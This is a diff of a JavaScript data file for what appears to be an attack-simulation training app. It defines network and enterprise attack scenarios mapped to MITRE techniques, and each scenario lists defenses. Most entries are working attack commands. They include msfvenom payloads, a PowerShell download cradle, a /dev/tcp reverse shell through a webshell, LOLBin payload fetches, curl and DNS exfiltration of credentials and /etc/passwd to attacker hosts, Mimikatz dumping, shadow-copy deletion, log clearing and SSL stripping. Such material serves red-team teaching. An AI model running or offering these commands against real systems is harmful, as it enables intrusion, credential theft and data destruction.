-detLogs:[{t:'warn',m:'[SW] Unexpected DTP frame received on access port Gi0/12'},{t:'alert',m:'[SW] Double-tagged 802.1Q frame detected on access port'},{t:'warn',m:'[NET] Trunk link negotiated on Gi0/12 — not designated trunk'},{t:'alert',m:'[SOC] Cross-VLAN traffic anomaly: 192.168.1.99 → VLAN 10'}],
-nodes:['attacker','switch','vlan10','vlan20'],flow:'vlan'},
-
-{id:'dhcp',name:'DHCP Starvation',sub:'Rogue Server Setup',layer:'L2',impact:7,stealth:6,complex:'LOW',layerLabel:'Data Link',color:'#ffcc00',
-mitre:{'Initial Access':['T1200 — Hardware Additions'],'Impact':['T1498 — Network DoS'],'Collection':['T1557 — MITM via Rogue DHCP']},
-tools:[{i:'🦴',n:'Yersinia',u:'DHCP starvation flood'},{i:'💀',n:'dhcpstarv',u:'DHCP pool exhaustion'},{i:'🏚',n:'isc-dhcp-server',u:'Rogue DHCP daemon'},{i:'🔥',n:'Metasploit',u:'auxiliary/server/dhcp'}],
-packets:[{layer:'UDP',fields:{src:'0.0.0.0:68',dst:'255.255.255.255:67',broadcast:'yes — LAN-wide'}},{layer:'DHCP DISCOVER',fields:{msg_type:'1 (DISCOVER)',chaddr:'de:ad:be:ef:XX:XX  ← random spoofed MAC',hostname:'random-host',params:'request IP, subnet, GW, DNS'}}],
-phases:[
-{label:'PHASE 1 — STARVATION',steps:[
-{t:'Exhaust DHCP Pool',d:'Flood server with DISCOVER requests using random spoofed MACs. Server assigns all IPs to ghost MACs in seconds.',cmd:'yersinia dhcp -attack 1\n# or: dhcpstarv -i eth0'},
-{t:'Verify Exhaustion',d:'Pool full = legitimate clients denied IP = network DoS. Verify no leases available.',cmd:'nmap --script broadcast-dhcp-discover\n# Should return: no free leases'}]},
-{label:'PHASE 2 — ROGUE SERVER',steps:[
-{t:'Configure Rogue DHCP',d:"Set gateway + DNS to your IP. Every new client will route all traffic through you.",cmd:'# /etc/dhcp/dhcpd.conf\nsubnet 192.168.1.0 netmask 255.255.255.0 {\n  range 192.168.1.200 192.168.1.250;\n  option routers 192.168.1.99;             # YOU\n  option domain-name-servers 192.168.1.99; # YOU\n}'},
-{t:'Start Server + Forwarding',d:'Forward traffic so victims stay connected — invisible MITM.',cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward\nservice isc-dhcp-server start'}]},
-{label:'PHASE 3 — VICTIM CAPTURE',steps:[
-{t:'Victims Accept Lease',d:'New/reconnecting devices broadcast DISCOVER → your server replies first → victim uses your gateway and DNS.',cmd:''},
-{t:'Full Traffic Intercept',d:'Every packet from every victim flows through you. DNS queries come to you. Complete visibility.',cmd:'tcpdump -i eth0 -w rogue.pcap\nbettercap -eval "net.sniff on"'}]},
-{label:'PHASE 4 — COMBINED ATTACK',steps:[
-{t:'Rogue DNS Poisoning',d:"You're the DNS server — resolve any domain to any IP. Victims can't detect it. Perfect phishing setup.",cmd:'bettercap -eval "dns.spoof.domains *; dns.spoof on"'},
-{t:'Persistence',d:'DHCP leases typically last 24h. Victims auto-renew — your MITM position persists automatically.',cmd:'ettercap -T -q -i eth0'}]}],
-detLogs:[{t:'alert',m:'[DHCP] Pool exhaustion: 254/254 leases consumed in 6 seconds'},{t:'alert',m:'[DHCP] Rogue DHCP server detected: 192.168.1.99 issuing leases'},{t:'warn',m:'[NET] 14 clients received 192.168.1.99 as default GW simultaneously'},{t:'stealth',m:'[SOC] Full MITM via rogue DHCP — clients trust attacker as GW+DNS'}],
-nodes:['attacker','victim','gateway','dhcp'],flow:'dhcp'},
-
-{id:'bgp',name:'BGP Hijacking',sub:'Route Injection',layer:'L3',impact:10,stealth:8,complex:'HIGH',layerLabel:'Network',color:'#0066ff',
-mitre:{'Initial Access':['T1590 — Gather Victim Network Info'],'Impact':['T1498 — Network DoS','T1565 — Data Manipulation'],'Collection':['T1040 — Sniffing at Internet Scale']},
-tools:[{i:'🌐',n:'BIRD',u:'BGP daemon for route injection'},{i:'🦓',n:'FRRouting',u:'Open source BGP router'},{i:'📡',n:'ExaBGP',u:'BGP announcement tool'},{i:'🔍',n:'BGPmon',u:'BGP hijack detection'}],
-packets:[{layer:'TCP',fields:{sport:'49152',dport:'179 (BGP)',flags:'BGP session on established TCP'}},{layer:'BGP UPDATE',fields:{type:'2 (UPDATE)',withdrawn:'none',nlri:'8.8.8.0/25  ← more specific than /24',next_hop:'203.0.113.1  ← attacker',as_path:'65001  ← attacker AS only'}}],
-phases:[
-{label:'PHASE 1 — INTELLIGENCE',steps:[
-{t:'Identify Target ASN',d:'Find ASN and IP prefixes of target. BGP routing is publicly visible — anyone can query looking glasses.',cmd:'whois -h whois.radb.net 8.8.8.0/24\nbgp.he.net  # AS visualization'},
-{t:'Map Upstream Peers',d:'Find which ISPs peer with target AS. These are propagation paths for your injected route.',cmd:'traceroute 8.8.8.8  # Each hop = AS boundary'}]},
-{label:'PHASE 2 — ROUTE INJECTION',steps:[
-{t:'Announce More-Specific Prefix',d:'BGP longest-prefix match: /25 beats /24. Announce /25 → routers prefer your route. Traffic from affected regions hits your AS.',cmd:'# exabgp config\nneighbor 203.0.113.1 {\n  local-as 65001; peer-as 65002;\n  announce 8.8.8.0/25 next-hop self;\n}'},
-{t:'Propagation',d:'Route spreads across internet via BGP within minutes. Affected regions now send traffic to you.',cmd:''}]},
-{label:'PHASE 3 — INTERCEPTION',steps:[
-{t:'Intercept at Scale',d:'Traffic destined for hijacked prefix arrives at your AS. Affects real users globally.',cmd:'tcpdump -i eth0 net 8.8.8.0/25'},
-{t:'Transparent Forward',d:'Forward to real destination after inspection — users see slight latency increase. Invisible internet-scale MITM.',cmd:'ip route add 8.8.8.0/25 via <real-next-hop>'}]},
-{label:'PHASE 4 — REAL-WORLD IMPACT',steps:[
-{t:'Historical Attacks',d:'2018: Amazon Route53 BGP hijack → $150K crypto stolen in 2hrs. 2010: China Telecom hijacked 15% of internet traffic for 18min. Both undetected for extended periods.',cmd:''},
-{t:'Black-Hole DoS',d:'Announce prefix but drop all traffic. Entire IP range goes dark for affected regions. Nation-state grade DoS with no attack traffic at target.',cmd:'ip route add blackhole 8.8.8.0/25'}]}],
-detLogs:[{t:'warn',m:'[BGP] New announcement: 8.8.8.0/25 from AS65001 (unexpected origin)'},{t:'alert',m:'[BGP] Prefix hijack: /25 more-specific overrides legitimate /24'},{t:'alert',m:'[NOC] Traffic rerouted through AS65001 — unrecognized ASN'},{t:'warn',m:'[RPKI] Route Origin Validation FAILED for 8.8.8.0/25'}],
-nodes:['attacker','isp1','isp2','internet'],flow:'bgp'},
-
-{id:'mitm',name:'Full MITM',sub:'Complete Interception',layer:'L2-L7',impact:10,stealth:6,complex:'HIGH',layerLabel:'All Layers',color:'#ff006e',
-mitre:{'Credential Access':['T1557 — Adversary-in-the-Middle','T1040 — Network Sniffing'],'Collection':['T1185 — Browser Session Hijacking'],'Defense Evasion':['T1553 — Subvert Trust Controls']},
-tools:[{i:'🔥',n:'Bettercap',u:'All-in-one MITM framework'},{i:'🦜',n:'Ettercap',u:'Classic MITM + sniffing'},{i:'🕷',n:'mitmproxy',u:'HTTP/S interception proxy'},{i:'🔐',n:'SSLstrip',u:'HTTPS→HTTP downgrade'}],
-packets:[{layer:'ETH',fields:{src:'de:ad:be:ef:00:01  ← ATTACKER',dst:'aa:bb:cc:dd:ee:ff',note:'victim thinks this is the gateway MAC'}},{layer:'HTTP POST',fields:{host:'bank.com  ← victim thinks HTTPS',path:'/login',body:'username=victim&password=s3cr3t  ← PLAINTEXT',note:'SSL stripped by attacker'}}],
-phases:[
-{label:'PHASE 1 — POSITION',steps:[
-{t:'ARP + DHCP Combo',d:'ARP spoof catches existing connections. Rogue DHCP catches new connections. Combined = full subnet coverage.',cmd:'bettercap -iface eth0 -eval "arp.spoof on; dhcp.spoof on; net.probe on"'},
-{t:'Transparent Forwarding',d:'Forward all traffic so victims maintain connectivity. Zero service disruption = zero suspicion.',cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080'}]},
-{label:'PHASE 2 — SSL ATTACK',steps:[
-{t:'SSL Strip',d:'Intercept HTTPS redirects. Serve HTTP to victim, maintain HTTPS to server. Victim sees padlock disappear.',cmd:'bettercap -eval "http.proxy on; set http.proxy.sslstrip true"'},
-{t:'HSTS Bypass',d:'HSTS-protected sites immune to SSL strip. Bypass via DNS spoof to typosquat (gooogle.com) or non-preloaded subdomains.',cmd:'bettercap -caplet hstshijack/hstshijack'}]},
-{label:'PHASE 3 — HARVEST',steps:[
-{t:'Credential Sniffer',d:'Auto-extract creds from HTTP POST, FTP AUTH, Telnet, IMAP LOGIN, POP3 USER/PASS in real time.',cmd:'bettercap -eval "net.sniff on; net.sniff.verbose true"'},
-{t:'Session Cookie Theft',d:"Steal authenticated session cookies. Replay in your browser — you're logged in as victim without knowing password.",cmd:'bettercap -caplet http-req-dump.cap\n# Extract Set-Cookie from responses'}]},
-{label:'PHASE 4 — INJECTION',steps:[
-{t:'JavaScript Injection',d:'Inject malicious JS into every HTTP page victim loads. Keyloggers, BeEF browser hooks, crypto miners.',cmd:'bettercap -eval "inject.js on; set inject.js.src /keylogger.js"'},
-{t:'Persistent Access',d:'Harvested VPN creds, SSH keys, session tokens → lateral movement to internal systems → establish persistence.',cmd:''}]}],
-detLogs:[{t:'alert',m:'[TLS] Certificate mismatch for bank.com — possible SSL proxy'},{t:'warn',m:'[HSTS] Bypass attempt on mail.google.com via DNS spoof'},{t:'alert',m:'[IDS] ARP spoof + HTTP proxy combo from 192.168.1.99'},{t:'alert',m:'[SOC] Full MITM confirmed — credential harvest active'}],
-nodes:['attacker','victim','gateway','internet'],flow:'mitm'}
+const SCEN=[
+{id:'NK-001',name:'Phishing to Foothold',cat:'Initial Access',diff:2,dur:'45 min',desc:'Craft a spear-phishing email to deliver a macro payload and establish initial access on a target workstation.',tactics:['Initial Access','Execution'],techs:[{id:'T1566.001',name:'Spear-Phishing Attachment',desc:'Send malicious Office document via targeted email to victim.',cmds:['# Generate malicious macro doc\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f vba > macro.vba','# Send phishing email\nswaks --to victim@corp.local --from it-support@helpdesk.com --attach invoice_Q4.docm']},{id:'T1059.001',name:'PowerShell Cradle',desc:'Macro triggers PowerShell to download and execute stage-2 payload.',cmds:['# IEX cradle\npowershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.5/s.ps1\')"','# Handler\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nrun']}],tools:['Metasploit','Swaks','Empire'],defense:['Email gateway sandboxing','PowerShell Constrained Language Mode','AMSI on all endpoints','Alert on Office spawning powershell.exe (Sysmon 1)']},
+{id:'NK-002',name:'SQL Injection Data Exfil',cat:'Initial Access',diff:3,dur:'60 min',desc:'Exploit a blind SQL injection to extract the full user database and exfiltrate credentials.',tactics:['Initial Access','Collection','Exfiltration'],techs:[{id:'T1190',name:'Exploit Public-Facing App',desc:'Exploit SQLi in login form to enumerate backend database.',cmds:['# Detect SQLi\nsqlmap -u "http://target.corp/login" --data="user=admin&pass=test" --level=5','# Dump DBs\nsqlmap -u "http://target.corp/login" --data="user=admin&pass=test" --dbs']},{id:'T1048.003',name:'Exfiltration Over HTTP',desc:'Extract credential data to attacker server.',cmds:['# Dump users\nsqlmap -D corp_db -T users --dump','# Exfil\ncurl -X POST http://10.10.14.5/exfil -d @users.csv']}],tools:['sqlmap','Burp Suite','curl'],defense:['Parameterized queries','WAF with SQLi ruleset','Database activity monitoring','Egress filtering on web server']},
+{id:'NK-003',name:'Pass-the-Hash',cat:'Lateral Movement',diff:3,dur:'50 min',desc:'Extract NTLM hashes and authenticate laterally without cracking passwords.',tactics:['Credential Access','Lateral Movement'],techs:[{id:'T1003.001',name:'LSASS Memory Dump',desc:'Dump LSASS to extract NTLM hashes.',cmds:['# Mimikatz\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords','# Procdump\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp']},{id:'T1550.002',name:'Pass the Hash',desc:'Authenticate via NTLM hash without plaintext password.',cmds:['# CrackMapExec PtH\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435:8846f7ea','# Shell via PtH\npth-winexe -U corp/Administrator%aad3:8846... //192.168.1.20 cmd.exe']}],tools:['Mimikatz','CrackMapExec','Impacket'],defense:['Windows Credential Guard','Restrict NTLM via GPO','Alert on unusual LSASS access (Sysmon 10)','Privileged Access Workstations']},
+{id:'NK-004',name:'Kerberoasting',cat:'Credential Access',diff:3,dur:'40 min',desc:'Request service tickets for SPN accounts and crack them offline.',tactics:['Credential Access'],techs:[{id:'T1558.003',name:'Kerberoasting',desc:'Enumerate SPNs, request TGS tickets, crack offline.',cmds:['# Enumerate SPNs\nGet-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName','# Dump hashes\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt','# Crack\nhashcat -m 13100 hashes.txt rockyou.txt']}],tools:['PowerView','Hashcat','Rubeus'],defense:['25+ char service account passwords','Managed Service Accounts (gMSA)','Alert on high TGS volume (Event 4769)','Audit RC4-HMAC tickets']},
+{id:'NK-005',name:'Ransomware Kill Chain',cat:'Impact',diff:5,dur:'90 min',desc:'Simulate full ransomware — initial access through encryption and shadow copy deletion.',tactics:['Initial Access','Execution','Defense Evasion','Impact'],techs:[{id:'T1486',name:'Data Encrypted for Impact',desc:'Encrypt files using symmetric encryption with asymmetric key wrapping.',cmds:['# Mass encrypt simulation\nGet-ChildItem C:\\Users -Recurse -Include *.docx,*.xlsx | ForEach-Object { Encrypt-File $_.FullName }','# Drop ransom note\necho "YOUR FILES ARE ENCRYPTED" > C:\\Users\\Public\\README_DECRYPT.txt']},{id:'T1490',name:'Inhibit System Recovery',desc:'Delete VSS shadow copies to prevent restoration.',cmds:['# Delete shadow copies\nvssadmin delete shadows /all /quiet','# Disable recovery\nbcdedit /set {default} recoveryenabled No']}],tools:['PowerShell','vssadmin','wmic'],defense:['Immutable off-site backups (3-2-1 rule)','VSS protection via GPO','EDR behavioral detection for mass encryption','Network segmentation to limit spread']},
+{id:'NK-006',name:'Web Recon to RCE',cat:'Initial Access',diff:4,dur:'75 min',desc:'Perform web recon, discover file upload vulnerability, achieve RCE via webshell.',tactics:['Reconnaissance','Initial Access','Execution'],techs:[{id:'T1595.002',name:'Vulnerability Scanning',desc:'Map attack surface with automated scanning.',cmds:['# Directory brute-force\nffuf -u http://target.corp/FUZZ -w seclists/common.txt','# Nuclei scan\nnuclei -u http://target.corp -severity medium,high,critical']},{id:'T1190',name:'File Upload Webshell',desc:'Bypass upload filter and execute webshell for RCE.',cmds:['# Upload bypass\ncurl -X POST http://target.corp/upload -F "file=@shell.php.jpg"','# Execute\ncurl "http://target.corp/uploads/shell.php.jpg?cmd=id"','# Reverse shell\ncurl "http://target.corp/uploads/shell.php.jpg?cmd=bash+-c+\'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261\'"']}],tools:['ffuf','Nuclei','Burp Suite','Weevely'],defense:['Server-side file validation (magic bytes)','Uploads outside webroot','Disable script execution in upload dirs','Content Security Policy headers']},
+{id:'NK-007',name:'Supply Chain Compromise',cat:'Initial Access',diff:5,dur:'120 min',desc:'Backdoor a software update package to gain access to downstream targets.',tactics:['Initial Access','Persistence'],techs:[{id:'T1195.002',name:'Compromise Software Supply Chain',desc:'Inject malicious code into build pipeline before signing.',cmds:['# Inject payload\npython3 inject.py --target build/app.dll --payload beacon.bin','# Sign with stolen cert\nsigntool sign /f stolen.pfx /p password build/app.dll']}],tools:['Custom injector','signtool','Cobalt Strike'],defense:['SBOM tracking','Binary signing verification','Integrity checks on updates','Isolated build environments']},
+{id:'NK-008',name:'Living off the Land',cat:'Defense Evasion',diff:3,dur:'55 min',desc:'Use built-in Windows binaries to evade AV and EDR detection.',tactics:['Execution','Defense Evasion'],techs:[{id:'T1218.005',name:'LOLBin Execution',desc:'Use mshta, certutil, regsvr32 to execute payloads.',cmds:['# Execute remote HTA\nmshta.exe http://10.10.14.5/payload.hta','# Certutil download\ncertutil -urlcache -split -f http://10.10.14.5/payload.exe C:\\Windows\\Temp\\svc.exe','# regsvr32 bypass\nregsvr32 /u /n /s /i:http://10.10.14.5/payload.sct scrobj.dll']}],tools:['mshta','certutil','regsvr32','bitsadmin'],defense:['Application control blocking LOLBin abuse','Script block logging (Event 4104)','Network monitoring from system processes','WDAC enforcement']},
+{id:'NK-009',name:'DNS Tunneling C2',cat:'Command and Control',diff:4,dur:'65 min',desc:'Establish a covert C2 channel using DNS queries to bypass firewall egress.',tactics:['Command and Control','Exfiltration'],techs:[{id:'T1071.004',name:'DNS C2 Protocol',desc:'Encode C2 traffic in DNS records to bypass firewall egress.',cmds:['# DNS C2 server\npython3 dnscat-server.py --secret=mysecret corp.attacker.com','# Client beacon\ndnscat2 --secret=mysecret corp.attacker.com','# DNS exfil\nfor chunk in $(base64 /etc/passwd | fold -w 50); do dig $chunk.exfil.attacker.com; done']}],tools:['dnscat2','iodine','DNSExfiltrator'],defense:['DNS query anomaly detection','Block external DNS resolvers','Recursive DNS logging to SIEM','DNS Response Policy Zone']},
+{id:'NK-010',name:'Process Injection',cat:'Defense Evasion',diff:4,dur:'60 min',desc:'Inject shellcode into a legitimate process to execute under a trusted context.',tactics:['Defense Evasion','Privilege Escalation'],techs:[{id:'T1055.001',name:'DLL Injection',desc:'Inject malicious DLL using CreateRemoteThread and LoadLibrary.',cmds:['# Classic DLL inject\nHANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);\nLPVOID pMem = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(hProc, pMem, dllPath, len, NULL);\nCreateRemoteThread(hProc, NULL, 0, LoadLibraryA, pMem, 0, NULL);','# PS reflective inject\nInvoke-ReflectivePEInjection -PEPath payload.dll -ProcName explorer']}],tools:['Mimikatz','Cobalt Strike','PowerSploit'],defense:['Sysmon Event 8 (CreateRemoteThread)','Windows Credential Guard','Enable PPL (Protected Process Light)','EDR rules for VirtualAllocEx chains']},
+{id:'NK-011',name:'Sudo Privilege Escalation',cat:'Privilege Escalation',diff:2,dur:'35 min',desc:'Exploit misconfigured sudo permissions on Linux to escalate to root.',tactics:['Privilege Escalation'],techs:[{id:'T1548.003',name:'Sudo Abuse',desc:'Enumerate sudo misconfigs using GTFOBins techniques.',cmds:['# Check sudo perms\nsudo -l','# Exploit vim\nsudo vim -c ":!/bin/bash"','# Exploit find\nsudo find / -name "*.conf" -exec /bin/bash \;','# Exploit env\nsudo env /bin/bash']}],tools:['LinPEAS','GTFOBins','PSPY'],defense:['Least privilege for sudo rules','Remove NOPASSWD from sudoers','Audit /etc/sudoers regularly','Sudo logging to SIEM (auth.log)']},
+{id:'NK-012',name:'SSH Brute Force',cat:'Credential Access',diff:2,dur:'30 min',desc:'Perform targeted SSH credential brute-force against an exposed server.',tactics:['Credential Access','Initial Access'],techs:[{id:'T1110.001',name:'Password Brute Force',desc:'Use Hydra to brute-force SSH credentials.',cmds:['# Enumerate algos\nnmap --script ssh-enum-algos -p 22 target.corp','# Brute force\nhydra -l admin -P rockyou.txt ssh://target.corp -t 4','# Post-access persistence\nssh-keygen -t ed25519 && cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys']}],tools:['Hydra','Medusa','Nmap'],defense:['Disable password SSH auth','Fail2Ban rate limiting','MFA for SSH with PAM','Alert on repeated auth failures']},
+{id:'NK-013',name:'Cloud IAM Escalation',cat:'Privilege Escalation',diff:4,dur:'70 min',desc:'Exploit misconfigured IAM roles in AWS to gain admin access.',tactics:['Privilege Escalation','Discovery','Credential Access'],techs:[{id:'T1078.004',name:'Cloud Account Abuse',desc:'Use low-privilege IAM key to escalate via role assumption.',cmds:['# Enumerate IAM\npython3 enumerate-iam.py --access-key AKIA... --secret-key ...','# Assume role\naws sts assume-role --role-arn arn:aws:iam::123456789:role/AdminRole --role-session-name pwned','# Attach admin policy\naws iam attach-user-policy --user-name lowpriv --policy-arn arn:aws:iam::aws:policy/AdministratorAccess']}],tools:['AWS CLI','enumerate-iam.py','Pacu','ScoutSuite'],defense:['IAM Access Analyzer','Least-privilege IAM policies','CloudTrail + GuardDuty','Disable unused access keys']},
+{id:'NK-014',name:'Active Directory Enumeration',cat:'Discovery',diff:2,dur:'40 min',desc:'Enumerate AD to map users, groups, GPOs, and trust relationships.',tactics:['Discovery','Reconnaissance'],techs:[{id:'T1069.002',name:'Domain Groups Enumeration',desc:'Use BloodHound and PowerView to map AD and find paths to DA.',cmds:['# Import PowerView\nImport-Module .\\PowerView.ps1','# Get domain info\nGet-Domain | Get-DomainController','# Find ACL misconfigs\nFind-InterestingDomainAcl -ResolveGUIDs','# BloodHound collect\nInvoke-BloodHound -CollectionMethod All -ZipFileName bh.zip']}],tools:['BloodHound','PowerView','ADExplorer'],defense:['Tiered admin model (Tier 0/1/2)','Alert on LDAP enumeration (Event 1644)','Protected Users group for privileged accounts','Limit BloodHound data collection via ACL hardening']},
+{id:'NK-015',name:'BloodHound to Domain Admin',cat:'Lateral Movement',diff:5,dur:'90 min',desc:'Chain privilege escalation from low-priv user to Domain Admin via BloodHound paths.',tactics:['Lateral Movement','Privilege Escalation'],techs:[{id:'T1482',name:'Domain Trust Discovery',desc:'Exploit AD ACL misconfigs to path to Domain Admin.',cmds:['# Shortest path in BloodHound UI\n# Mark as owned -> Find Shortest Paths to Domain Admins','# Exploit GenericAll\nAdd-DomainGroupMember -Identity "Domain Admins" -Members lowpriv','# DCSync via WriteDACL\nAdd-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity lowpriv -Rights DCSync','# Dump all hashes\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv']}],tools:['BloodHound','PowerView','Mimikatz'],defense:['Defensive BloodHound runs to find paths','Fix ACL misconfigs in AD','Tiered Administration enforcement','DCSync monitoring (Event 4662)']},
+{id:'NK-016',name:'Container Escape',cat:'Privilege Escalation',diff:4,dur:'65 min',desc:'Break out of a Docker container to compromise the host system.',tactics:['Privilege Escalation','Defense Evasion'],techs:[{id:'T1611',name:'Escape to Host',desc:'Exploit privileged container or docker socket to escape to host.',cmds:['# Check if privileged\ncat /proc/self/status | grep CapEff','# Escape via docker socket\ndocker -H unix:///var/run/docker.sock run -it -v /:/hostfs alpine chroot /hostfs sh','# cgroup escape\nmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\necho "1" > /tmp/cgrp/x/notify_on_release']}],tools:['Docker','cdk','amicontained'],defense:['Never run --privileged containers','Do not mount docker.sock','Seccomp and AppArmor profiles','Rootless Docker / Podman']},
+{id:'NK-017',name:'API Key Extraction',cat:'Credential Access',diff:3,dur:'45 min',desc:'Hunt for hardcoded API keys in source code and configs, then abuse them.',tactics:['Credential Access','Collection'],techs:[{id:'T1552.001',name:'Credentials in Files',desc:'Search repositories for hardcoded secrets.',cmds:['# Git history scan\ngit log -p | grep -Ei "(api_key|secret|password|token)"','# TruffleHog\ntrufflehog git https://github.com/corp/app --only-verified','# Gitleaks\ngitleaks detect --source . --verbose']}],tools:['TruffleHog','Gitleaks','Semgrep'],defense:['Pre-commit hooks with gitleaks','Rotate secrets on detection','Secrets managers (Vault, AWS SM)','SAST pipeline integration']},
+{id:'NK-018',name:'Insider Threat Data Theft',cat:'Exfiltration',diff:3,dur:'50 min',desc:'Simulate a malicious insider collecting and exfiltrating sensitive data.',tactics:['Collection','Exfiltration'],techs:[{id:'T1074.001',name:'Local Data Staging',desc:'Collect and archive sensitive documents before exfiltration.',cmds:['# Find sensitive docs\nGet-ChildItem -Path C:\\corp -Recurse -Include *confidential*,*salary* | Copy-Item -Destination C:\\staging','# Archive\n7z a -p"password" staging.7z C:\\staging\\','# Exfil to cloud\ncurl --upload-file staging.7z "https://content.dropboxapi.com/2/files/upload" -H "Authorization: Bearer TOKEN"']}],tools:['7-Zip','rclone','curl'],defense:['DLP monitoring for sensitive patterns','UEBA anomaly detection','CASB for cloud access','Alert on large archive + upload']},
+{id:'NK-019',name:'ARP Spoofing MITM',cat:'Credential Access',diff:3,dur:'45 min',desc:'Perform ARP cache poisoning to intercept network credentials.',tactics:['Credential Access','Collection'],techs:[{id:'T1557.002',name:'ARP Cache Poisoning',desc:'Poison ARP tables to intercept LAN traffic.',cmds:['# Enable forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward','# ARP poison\narpspoof -i eth0 -t 192.168.1.10 192.168.1.1 &\narpspoof -i eth0 -t 192.168.1.1 192.168.1.10 &','# SSL strip\nbettercap -iface eth0 -eval "arp.spoof on; net.sniff on"']}],tools:['arpspoof','bettercap','Ettercap','Wireshark'],defense:['Dynamic ARP Inspection (DAI)','802.1X port authentication','HTTPS-only with HSTS preloading','VLAN segmentation']},
+{id:'NK-020',name:'Password Spray Attack',cat:'Credential Access',diff:2,dur:'30 min',desc:'Low-and-slow password spray against Office 365 and internal services.',tactics:['Credential Access','Initial Access'],techs:[{id:'T1110.003',name:'Password Spraying',desc:'Test one common password against many accounts to avoid lockout.',cmds:['# O365 spray\npython3 MSOLSpray.py --userlist users.txt --password "Winter2024!"','# Kerberos spray\nRubeus.exe brute /users:users.txt /password:Winter2024! /domain:corp.local','# CME spray\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p Winter2024! --no-bruteforce']}],tools:['MSOLSpray','Rubeus','CrackMapExec'],defense:['Smart Lockout detection','MFA on all accounts','Alert on single-password multi-user attempts','Conditional Access policies']},
+{id:'NK-021',name:'Log Clearing Anti-Forensics',cat:'Defense Evasion',diff:3,dur:'40 min',desc:'Cover tracks by clearing Windows event logs and tampering with timestamps.',tactics:['Defense Evasion'],techs:[{id:'T1070.001',name:'Clear Windows Event Logs',desc:'Clear event logs and tamper with file timestamps.',cmds:['# Clear all logs\nwevtutil el | ForEach-Object { wevtutil cl "$_" }','# Clear Security\nwevtutil cl Security','# Timestomp\n(Get-Item payload.exe).LastWriteTime = "01/01/2020 10:00:00"','# Remove prefetch\ndel /F /Q C:\\Windows\\Prefetch\\*.pf']}],tools:['wevtutil','SDelete'],defense:['Centralised log forwarding to SIEM','Immutable logging (Splunk/Sentinel)','Alert on Event ID 1102 / 104','Write-once log storage']},
+{id:'NK-023',name:'SSRF to Cloud Metadata',cat:'Initial Access',diff:4,dur:'55 min',desc:'Exploit Server-Side Request Forgery in a web app to query AWS IMDS and steal IAM credentials.',tactics:['Initial Access','Credential Access'],techs:[{id:'T1552.005',name:'Cloud Instance Metadata API',desc:'Abuse SSRF to hit AWS IMDS endpoint and retrieve IAM role credentials.',cmds:['# Detect SSRF via Burp\nGET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\n\n# Retrieve IAM credentials via IMDS\ncurl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"\ncurl "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role"','# Use stolen credentials\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws sts get-caller-identity\naws s3 ls']},{id:'T1078.004',name:'Valid Cloud Accounts',desc:'Pivot using the stolen IAM session tokens to enumerate and escalate in AWS.',cmds:['# Enumerate IAM permissions\naws iam list-attached-user-policies --user-name target\naws iam simulate-principal-policy --policy-source-arn ...\n# Escalate via PassRole\naws iam create-instance-profile --instance-profile-name AttackProfile\naws ec2 associate-iam-instance-profile --instance-id i-0abc... --iam-instance-profile Name=AttackProfile']}],tools:['Burp Suite','AWS CLI','Pacu','curl'],defense:['IMDSv2 enforcement (PUT token requirement)','Block SSRF via egress allow-listing on web servers','Least-privilege IAM — no PassRole on app roles','CloudTrail alarm on GetCallerIdentity from new IPs']},
+{id:'NK-024',name:'OAuth 2.0 App Abuse',cat:'Initial Access',diff:3,dur:'50 min',desc:'Register a malicious OAuth app and trick a victim into granting access to their cloud email and calendar.',tactics:['Initial Access','Collection'],techs:[{id:'T1528',name:'Steal Application Access Token',desc:'Craft OAuth phishing page — victim authorises malicious app and token is captured.',cmds:['# Register malicious app in Azure AD\naz ad app create --display-name "IT-Helpdesk-Tool" --reply-urls "https://attacker.com/callback"\n# Craft consent URL\nhttps://login.microsoftonline.com/common/oauth2/authorize?\n  client_id=<APP_ID>&response_type=code&\n  scope=Mail.Read+Calendars.Read+User.Read&\n  redirect_uri=https://attacker.com/callback\n# Exchange code for token\ncurl -X POST https://login.microsoftonline.com/common/oauth2/token \\\n  -d "code=<AUTH_CODE>&grant_type=authorization_code&client_id=...&client_secret=..."']},{id:'T1114.002',name:'Remote Email Collection',desc:'Use the OAuth access token to read victim email and exfiltrate via Microsoft Graph API.',cmds:['# Read inbox via Graph\ncurl -H "Authorization: Bearer <TOKEN>" \\\n  "https://graph.microsoft.com/v1.0/me/messages?$top=50"\n# Download attachments\ncurl -H "Authorization: Bearer <TOKEN>" \\\n  "https://graph.microsoft.com/v1.0/me/messages/<ID>/attachments"']}],tools:['Burp Suite','Microsoft Graph Explorer','TokenTacticsV2','curl'],defense:['Enforce admin consent for all OAuth app registrations','App governance policies in M365 Defender','Conditional Access — block unmanaged apps','Alert on new OAuth app consents in Entra ID logs']},
